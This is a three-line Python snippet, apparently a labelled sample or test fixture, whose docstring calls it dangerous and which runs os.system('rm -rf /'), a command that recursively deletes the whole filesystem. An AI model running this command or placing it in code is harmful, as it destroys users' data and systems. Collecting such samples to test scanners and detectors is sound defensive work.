"""Dangerous: recursive delete via os.system."""
import os
os.system("rm -rf /")